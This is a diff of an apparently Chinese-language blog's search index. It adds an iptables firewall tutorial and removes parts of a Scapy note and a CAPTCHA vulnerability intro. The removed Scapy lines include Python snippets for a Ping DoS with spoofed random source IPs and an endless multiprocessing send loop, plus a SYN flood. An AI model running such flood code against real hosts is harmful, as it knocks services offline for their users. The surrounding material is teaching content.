-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; res, unans = sr(pkt)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; res</span><br><span class="line">&lt;Results: TCP:1 UDP:0 ICMP:0 Other:0&gt;</span><br><span class="line">&gt;&gt;&gt; unans</span><br><span class="line">&lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><code>sr()</code>和<code>sr1()</code>的区别在于，<code>sr1()</code>只有一个返回值（<code>Results</code>）。</p>
-</blockquote>
-<h2 id="Ping-DoS"><a href="#Ping-DoS" class="headerlink" title="Ping DoS"></a>Ping DoS</h2><ul>
-<li>使用<code>Ping</code>进行<code>DoS</code>攻击时，由于<code>Ping</code>使用的是<code>ICMP</code>协议，下面给出<code>ICMP()</code>的参数解析。</li>
+</li>
 </ul>
 <blockquote>
-<p><code>ICMP()</code>参数解析</p>
+<p>iptables允许用户使用这些链和规则</p>
 </blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>type</td>
-<td>消息类型</td>
-<td>echo-request</td>
-</tr>
-<tr>
-<td>code</td>
-<td>代码</td>
-<td>0</td>
-</tr>
-<tr>
-<td>chksum</td>
-<td>校验和</td>
-<td>None</td>
-</tr>
-<tr>
-<td>id</td>
-<td>标识</td>
-<td>0x0</td>
-</tr>
-<tr>
-<td>seq</td>
-<td>序号</td>
-<td>0x0</td>
-</tr>
-</tbody>
-</table>
-</div>
-<ul>
-<li><code>Ping</code>攻击报文的设置比较简单，通过随机配置<code>ICMP()</code>也能实现<code>Ping DoS</code>的攻击效果。</li>
-<li>结合<code>IP()</code>设置目标主机<code>IP</code>。</li>
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ul>
+<li>iptables工作原理</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#判断是否随机源</span></span><br><span class="line"><span class="keyword">if</span> random_source ==<span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#随机构造IP</span></span><br><span class="line">    source_ip = Random_IP()</span><br><span class="line"></span><br><span class="line">    ip_proto = IP(src = source_ip,</span><br><span class="line">                  dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip_proto = IP(dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line">	<span class="comment">#id_ping和seq_ping均为随机配置</span></span><br><span class="line">    icmp_proto = ICMP(<span class="built_in">id</span> = id_ping,</span><br><span class="line">                      seq = seq_ping)</span><br><span class="line">    <span class="comment">#设置数据内容</span></span><br><span class="line">    data = <span class="string">b&#x27;ping dos&#x27;</span></span><br><span class="line">	</span><br><span class="line">    pkt = ip_proto / icmp_proto / data *<span class="number">100</span></span><br><span class="line">    send(pkt)</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.frozentux.net/iptables-tutorial/images/tables_traverse.jpg" alt=""></p>
+<blockquote>
+<p>小写是表，大写是链。</p>
+<p><strong>所有(无论内部外部)进入网卡的IP数据包都必须经历这个流程！</strong></p>
+</blockquote>
 <ul>
-<li>在这基础上，要想达到效果，我们需要增加攻击报文的量。</li>
-<li>通过循环重复攻击之外，我们采用多进程并发的方式增大攻击频率。</li>
+<li>如果 IP 数据包到达一个内置链的末端，包括一个空链，那么该链的策略target 便决定 IP 数据包的最终目的地。</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#processes设置太高会影响本机运作，太低起不到干扰效果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping_concurrent</span>(<span class="params">host, processes=<span class="number">5</span>, random_source=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="comment">#创建进程池</span></span><br><span class="line">    pool = multiprocessing.Pool(processes=processes)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#选择进程的任务和参数</span></span><br><span class="line">            pool.apply_async(ping_times, (host, random_source))</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            pool.terminate()</span><br></pre></td></tr></table></figure>
-<h2 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN_Flood"></a>SYN_Flood</h2><ul>
-<li>多进程和重复次数的性质和<code>Ping DoS</code>一致，这里主要的区别在于把<code>ICMP</code>协议换成了<code>TCP</code>协议。</li>
+<h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul>
+<li>iptables本质上<strong>不是通常定义的防火墙</strong>，实践上是做了一个代理。<ul>
+<li>将用户设置的安全规则在安全框架(netfilter)中执行。</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Randomly generate source port</span></span><br><span class="line">src_port = randint(<span class="number">1</span>,<span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">tcp_proto = TCP(sport = src_port,</span><br><span class="line">                dport = port,</span><br><span class="line">                flags = <span class="string">&quot;S&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = ip_proto / tcp_proto</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p><strong>netfilter位于内核空间</strong>，是真正的防火墙框架。</p>
+<p>iptables在用户空间，可以控制安全框架。</p>
+</blockquote>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul>
+<li>在任何接口上接收的网络数据包都将<strong>按照流程图</strong>中所示的顺序遍历表的流量控制链。</li>
+<li><u>第一个路由决策</u>涉及<strong>决定信息包的最终目的地是本地机器</strong>(在这种情况下，信息包<strong>通过INPUT链</strong>)<strong>还是其他机器</strong>(在这种情况下，信息包<strong>通过FORWARD链</strong>)。</li>
+<li><u>随后的路由决策</u>包括<strong>决定将哪个接口分配给一个出包</strong>。<ul>
+<li>在路径中的每个链上，该链中的每个规则都<strong>按顺序计算</strong>，每当规则匹配时，就执行相应的目标/跳转操作。<strong>3个最常用的目标是ACCEPT、DROP和跳转到用户定义链</strong>。</li>
+<li>虽然<strong>内置链可以有默认策略</strong>，但<strong>用户定义链不能</strong>。</li>
+<li>如果跳过的链中的每个规则<u>都不能提供完全匹配</u>，则包将<strong>被丢回调用链中</strong>，如下图所示。</li>
+<li>如果在任何时候<u>对具有DROP目标的规则实现了完全匹配</u>，则<strong>丢弃数据包</strong>，不再进行进一步的处理。</li>
+<li>如果一个包<u>在一个链中被ACCEPT</u>，它也<strong>将在<u>所有超集链</u>中被ACCEPT</strong>，并且它<strong>将不再进一步遍历任何超集链</strong>。但是，包将继续<strong><u>以正常方式遍历</u>其他表中的所有其他链</strong>。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://www.frozentux.net/iptables-tutorial/images/table_subtraverse.jpg" alt=""></p>
+<h1 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h1><h2 id="表"><a href="#表" class="headerlink" title="表"></a>表</h2><ul>
+<li>iptables 包含五个表：<ol>
+<li>raw仅用于配置数据包，使它们免于连接跟踪。</li>
+<li>filter是默认表，通常与防火墙相关联的所有操作都发生在该表中。</li>
+<li>nat用于网络地址转换（例如端口转发）。</li>
+<li>mangle用于专门的数据包更改。</li>
+<li>security用于强制访问控制网络规则。</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p><strong>常用的表为filter和nat</strong>。</p>
+</blockquote>
+<h2 id="链"><a href="#链" class="headerlink" title="链"></a>链</h2><ul>
+<li><p>表由链组成，链是按顺序遵循的规则列表。</p>
 <ul>
-<li>其中<code>flags</code>变量表示了<code>TCP</code>三次握手的不同状态，<code>S</code>表示<code>SYN</code>。</li>
+<li>缺省表filter包含三个内置链：INPUT、OUTPUT和FORWARD，它们在包过滤过程的不同点被激活。</li>
+<li>nat表包括PREROUTING、POSTROUTING和OUTPUT链。</li>
+</ul>
+</li>
+<li><p><strong>缺省情况下，没有一个链包含规则</strong>。将规则附加到想要使用的链上<strong>由用户自己决定</strong>。</p>
+</li>
+<li>链有一个默认策略，通常将其设置为ACCEPT，但如果希望确保没有任何东西能通过规则集，则可以将其重置为DROP。<ul>
+<li>默认策略总是<strong>只应用于链的末端</strong>。因此，在应用缺省策略之前，信息包必须通过链中的所有现有规则。</li>
+<li>可以添加用户定义链，使规则集更高效或更容易修改。</li>
+</ul>
+</li>
+</ul>
+<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><ul>
+<li>包过滤是基于规则的，<strong>规则由多个<u>匹配项</u>(报文必须满足的条件才能应用该规则)和一个<u>目标</u>(报文匹配所有条件时的动作)指定</strong>。<ul>
+<li>规则可能匹配的典型内容是数据包来自哪个网卡(例如eth0或eth1)，它是什么类型的数据包(ICMP、TCP或UDP)，或者数据包的目的端口。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>使用-j或—jump选项指定目标。</p>
+</blockquote>
+<ul>
+<li><strong>目标</strong>可以是<strong>用户定义链</strong>(如果这些条件匹配，则跳转到以下用户定义链并在那里继续处理)、<strong>特殊的内置目标之一或目标扩展</strong>。<ul>
+<li><strong>内置目标</strong>是ACCEPT, DROP, QUEUE和RETURN，如果目标是内置目标，则<strong>立即决定数据包的命运</strong>，并停止对当前表中的数据包的处理。</li>
+<li><strong>目标扩展</strong>包括例如REJECT和LOG。</li>
+<li><strong>用户定义链</strong>，若数据包的命运不是由该链决定的，它将<strong>根据原始链的剩余规则进行过滤</strong>。目标扩展可以是终止的(作为内置目标)或非终止的(作为用户定义的链)。</li>
+</ul>
+</li>
+</ul>
+<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><ul>
+<li>有许多模块可用于扩展 iptables，例如 connlimit、conntrack、limit 和 recent。<ul>
+<li>这些模块添加了额外的功能以<strong>允许复杂的过滤规则</strong>。</li>
+</ul>
+</li>
+</ul>
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ul>
+<li>iptables是一个<strong>systemd服务</strong>，叫做iptables.service。<ul>
+<li>iptables包在<code>/etc/iptables/iptables.rules</code>中安装了一组空的规则，当你第一次启动iptables.service单元时将加载这些规则。</li>
+<li>与其他服务一样，如果希望iptables在引导时自动加载，则必须启用它。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>IPv6的iptables规则默认保存在<code>/etc/iptables/ip6tables.rules</code>中，由ip6tables.service读取。</p>
+</blockquote>
+<ul>
+<li>如下所示，通过命令行添加规则后，配置文件不会自动更改，必须手动保存:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-save -f /etc/iptables/iptables.rules</span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果手动编辑配置文件，则必须重新加载iptables。或者你可以直接通过iptables加载它：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-restore /etc/iptables/iptables.rules</span><br></pre></td></tr></table></figure>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="显示当前规则"><a href="#显示当前规则" class="headerlink" title="显示当前规则"></a>显示当前规则</h2><ul>
+<li>列出当前规则的基本命令是list-rules (-S)，其输出格式类似于iptables-save实用程序。<ul>
+<li>这两个命令的主要区别是，后者默认输出<strong>所有表</strong>的规则，而所有iptables命令默认只输出<strong>filter表</strong>。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -S</span><br><span class="line">-P INPUT ACCEPT</span><br><span class="line">-P FORWARD ACCEPT</span><br><span class="line">-P OUTPUT ACCEPT</span><br></pre></td></tr></table></figure>
+<ul>
+<li>—list (-L)命令接受更多修饰符并显示更多信息。<ul>
+<li>例如，可以使用以下命令查看当前的规则集和每条规则的命中次数:</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL</span><br><span class="line">Chain INPUT (policy ACCEPT 1059 packets, 89762 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 1051 packets, 88652 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果输出像上面那样，那么在默认的过滤表中没有规则(即没有阻塞)。</p>
+<p>可以使用-t选项指定其他表。</p>
+</blockquote>
+<ul>
+<li>要在列出规则时显示行号，请将—line-numbers追加到该输入。当在命令行上编辑规则时，行号是一种有用的速记。</li>
+</ul>
+<h2 id="重置规则"><a href="#重置规则" class="headerlink" title="重置规则"></a>重置规则</h2><ul>
+<li>可以使用以下命令将iptables刷新和重置为默认值：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -X</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -t mangle -X</span><br><span class="line">iptables -t raw -F</span><br><span class="line">iptables -t raw -X</span><br><span class="line">iptables -t security -F</span><br><span class="line">iptables -t security -X</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br></pre></td></tr></table></figure>
+<ul>
+<li>不带参数的-F命令将<strong>刷新其当前表中的所有链</strong>。<ul>
+<li>类似地，-X<strong>删除表中所有空的非默认链</strong>。</li>
+<li>可以通过在-F和-X后面<u>加上[chain]参数</u>来<strong>清除或删除单个链</strong>。</li>
+</ul>
+</li>
+</ul>
+<h2 id="编辑规则"><a href="#编辑规则" class="headerlink" title="编辑规则"></a>编辑规则</h2><ul>
+<li>可以通过以下方式<strong>编辑规则</strong>：在链上添加-A规则，在链上的特定位置插入-I，替换现有规则-R，或删除-D规则。<ul>
+<li>下面举例说明了前三个命令。</li>
+</ul>
+</li>
+<li>首先，我们的计算机不是路由器。我们希望将FORWARD链上的默认策略从ACCEPT更改为DROP。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -P FORWARD DROP</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Dropbox的局域网同步功能每30秒向它能看到的所有计算机广播数据包。如果我们碰巧与Dropbox客户端在局域网中，并且没有使用该功能，那么我们可能会希望拒绝这些数据包。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 17500 -j REJECT --reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 67 packets, 5771 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP 0 packets, 0 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 55 packets, 5174 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：这里我们<strong>使用REJECT而不是DROP</strong>，因为RFC 1122<u>要求主机尽可能地返回ICMP错误，而不是丢弃数据包</u>。<a href="https://www.chiark.greenend.org.uk/~peterb/network/drop-vs-reject">这一页</a>解释了为什么拒绝包几乎总是比DROP包更好。</p>
+</blockquote>
+<ul>
+<li>现在，假设我们改变了对Dropbox的看法，决定在自己的电脑上安装它。我们还想进行局域网同步，但只能与网络上的一个特定IP进行同步。<ul>
+<li>所以我们应该<strong>用-R来代替原来的规则</strong>。其中10.0.0.85是我们的其他IP：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -R INPUT 1 -p tcp --dport 17500 ! -s 10.0.0.85 -j REJECT --reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 21 packets, 1849 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 REJECT     tcp  --  *      *      !10.0.0.85            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>我们现在已经用一个允许10.0.0.85访问17500端口的规则替换了原来的规则。</p>
+</blockquote>
+<ul>
+<li>我们意识到这是<strong>不可扩展的</strong>。如果我们<u>友好的Dropbox用户</u>试图访问设备上的17500端口，我们应该<u>立即允许</u>他，而不是测试他是否违反任何防火墙规则。<ul>
+<li>因此，我们编写了一个新的规则，允许我们的信任用户。使<strong>用-I将新规则插入到旧规则之前</strong>：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 17500 -s 10.0.0.85 -j ACCEPT -m comment --comment <span class="string">&quot;Friendly Dropbox&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 19 packets, 1857 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 ACCEPT     tcp  --  *      *       10.0.0.85            0.0.0.0/0            tcp dpt:17500 /* Friendly Dropbox */</span><br><span class="line">2        0     0 REJECT     tcp  --  *      *      !10.0.0.85            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP 0 packets, 0 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 16 packets, 1892 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure>
+<ul>
+<li>把我们的第二条规则替换成拒绝所有17500端口的规则：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -R INPUT 2 -p tcp --dport 17500 -j REJECT --reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 19 packets, 1656 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 ACCEPT     tcp  --  *      *       10.0.0.85            0.0.0.0/0            tcp dpt:17500 /* Friendly Dropbox */</span><br><span class="line">2        0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP 0 packets, 0 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 15 packets, 2224 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination </span><br></pre></td></tr></table></figure>
+<h2 id="允许组播流量"><a href="#允许组播流量" class="headerlink" title="允许组播流量"></a>允许组播流量</h2><ul>
+<li>使用多播标识的协议(例如，SANE搜索网络扫描器)将向网络的广播IP发送流量，并从特定的客户端的IP返回响应。<ul>
+<li>由于这些IP地址是不同的，所以iptables不会将响应识别为RELATED或ESTABLISHED，它将<strong>阻塞响应</strong>。</li>
+</ul>
+</li>
+<li>首先，创建一个ipset散列容器。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipset create upnp <span class="built_in">hash</span>:ip,port <span class="built_in">timeout</span> 3</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>timeout是接受客户端响应的时间窗口。</p>
+</blockquote>
+<ul>
+<li>其次，创建一个规则，将传出多播流量添加到ipset散列中。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -d 239.255.255.250/32 -p udp -m udp -j SET --add-set upnp src,src --exist</span><br></pre></td></tr></table></figure>
+<ul>
+<li>第三，创建一个规则，允许与ipset散列匹配的传入流量。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p udp -m <span class="built_in">set</span> --match-set upnp dst,dst -j ACCEPT</span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后，记住保存新规则，并确保启用iptables.service和ipset.service，以便在系统启动时加载规则。</li>
+</ul>
+<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><ul>
+<li><p>LOG目标可以用来记录命中规则的数据包。与其他目标(如ACCEPT或DROP)不同，<strong>包在命中LOG目标后将继续在链中移动</strong>。</p>
+<ul>
+<li>这意味着，为了对所有丢失的包启用日志记录，必须在每个DROP规则之前添加一个重复的LOG规则。</li>
+<li>由于这降低了效率并使事情变得不那么简单，因此可以创建一个logdrop链。</li>
+</ul>
+</li>
+<li><p>创建链</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -N logdrop</span><br></pre></td></tr></table></figure>
+<ul>
+<li>并将以下规则添加到新创建的链:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A logdrop -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/m --limit-burst 10 -j LOG</span><br><span class="line">iptables -A logdrop -j DROP</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>limit和limit-burst选项解释<a href="#限制日志速率">如下</a>。</p>
+</blockquote>
+<ul>
+<li>现在，当我们想要丢弃一个包并记录这个事件时，我们只需跳转到日志丢弃链，例如：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -m conntrack --ctstate INVALID -j logdrop</span><br></pre></td></tr></table></figure>
+<h2 id="限制日志速率"><a href="#限制日志速率" class="headerlink" title="限制日志速率"></a>限制日志速率</h2><ul>
+<li>上面的logdrop链<strong>使用<u>limit模块</u>来防止iptables日志变得太大或导致不必要的硬盘写操作</strong>。<ul>
+<li>在不限制错误配置的服务尝试连接的情况下，攻击者可以<u>通过引起对iptables日志的写入来填充驱动器</u>(或至少是<code>/var</code>分区)。</li>
+</ul>
+</li>
+<li>limit模块<strong>使用-m limit调用</strong>。<ul>
+<li>使用—limit来<strong>设置平均速率</strong>；</li>
+<li>使用—limit-burst来<strong>设置初始突发速率</strong>。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A logdrop -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/m --limit-burst 10 -j LOG</span><br></pre></td></tr></table></figure>
+<ul>
+<li>上述命令<u>附加</u>一个规则，该规则将记录通过它的所有数据包。<ul>
+<li>记录<u>前10个连续数据包</u>，从那时起<u>每分钟仅记录5个数据包</u>。</li>
+<li>每当“限制速率”未被打破时，“限制突发”计数将被重置，即日志记录活动自动恢复正常。</li>
+</ul>
+</li>
+</ul>
+<h2 id="查看记录包"><a href="#查看记录包" class="headerlink" title="查看记录包"></a>查看记录包</h2><ul>
+<li>记录的数据包在systemd journal中<strong>作为内核消息可见</strong>。</li>
+<li>要查看自计算机最后一次启动以来记录的所有包：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">journalctl -k --grep=<span class="string">&quot;IN=.*OUT=.*&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="syslog-ng"><a href="#syslog-ng" class="headerlink" title="syslog-ng"></a>syslog-ng</h2><ul>
+<li>可以在syslog-ng.conf中<strong>控制iptables的日志输出到哪里</strong>。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Replace</span></span><br><span class="line">filter f_everything &#123; level(debug..emerg) and not facility(auth, authpriv); &#125;;</span><br><span class="line"><span class="comment"># To</span></span><br><span class="line">filter f_everything &#123; level(debug..emerg) and not facility(auth, authpriv) and not filter(f_iptables); &#125;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这将停止将iptables输出记录到<code>/var/log/everything.log</code>。</p>
+</blockquote>
+<ul>
+<li>如果你也想让iptables记录到不同于<code>/var/log/iptables.log</code>的文件中，可以简单地改变目标d_iptables的文件值(仍然在syslog-ng.conf中):</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">destination d_iptables &#123; file(<span class="string">&quot;/var/log/iptables.log&quot;</span>); &#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="ulogd"><a href="#ulogd" class="headerlink" title="ulogd"></a>ulogd</h2><ul>
+<li>ulogd是用于netfilter的专用用户空间包日志记录守护进程，它可以替换默认的LOG目标。</li>
+<li>ulogd包可以在[community]存储库中找到。</li>
 </ul>
 ]]></content>
       <categories>
         <category>note</category>
       </categories>
       <tags>
-        <tag>Scapy</tag>
+        <tag>Linux</tag>
+        <tag>iptables</tag>
       </tags>
   </entry>
   <entry>
@@ -4071,88 +3816,258 @@
       </tags>
   </entry>
   <entry>
-    <title>Insecure CAPTCHA introduce and usage</title>
-    <url>/2022/05/17/vuln_Insecure_CAPTCHA/</url>
-    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><ul>
-<li><a href="https://baike.baidu.com/item/Captcha/9630117?fr=aladdin"><code>CAPTCHA</code></a>项目是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的<a href="https://baike.baidu.com/item/图灵测试/1701255">图灵测试</a>)的简称，是一种区分用户是计算机和人的公共全自动程序。</li>
-<li>使用<code>CAPTCHA</code>可以防止计算机恶意破解密码、刷单等，保证用户是人类(无法快速反复发送请求)。</li>
-<li>攻击者绕过<code>CAPTCHA</code>验证后，可以使用恶意脚本操控计算机反复发送请求或者在异地实现绕过验证的<code>CSRF</code>攻击。</li>
+    <title>Scapy note</title>
+    <url>/2022/05/17/note_scapy/</url>
+    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul>
+<li>首先给出<a href="https://scapy.net/">官网</a>。</li>
+<li><code>Scapy</code>是用<code>Python</code>编写的交互式数据包处理工具。</li>
+<li>使用<code>Scapy</code>可以伪造或解码各种协议的数据包，在线发送它们，捕获它们，匹配请求和答复等等。 </li>
 </ul>
-<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><ul>
-<li><code>CAPTCHA</code>漏洞利用验证机制的逻辑漏洞，下面给出验证流程。</li>
-<li><img src="https://img-blog.csdnimg.cn/img_convert/a3b170d0ddcb6627ed51ab4634c0ae3f.png" alt=""></li>
-<li>服务器使用<a href="http://api.drupalhelp.net/api/recaptcha/recaptcha--recaptchalib.php/function/recaptcha_check_answer/5.2">recaptcha_check_answer()</a>函数验证用户输入的正确性</li>
+<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><ul>
+<li>由于是<code>Python</code>编写的，使用<code>pip install</code>进行安装，这里使用清华源加速。</li>
 </ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install scapy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接使用<code>scapy</code>命令打开，若显示无法导入相关库，则对其中缺失的相关包进行安装。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">INFO: Can<span class="string">&#x27;t import matplotlib. Won&#x27;</span>t be able to plot.</span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br></pre></td></tr></table></figure>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="包配置"><a href="#包配置" class="headerlink" title="包配置"></a>包配置</h2><ul>
+<li>使用<code>TCP/IP</code>协议构造基本数据包，这里调用了<code>Scapy</code>的内置函数<code>IP()</code>和<code>TCP()</code>。</li>
+</ul>
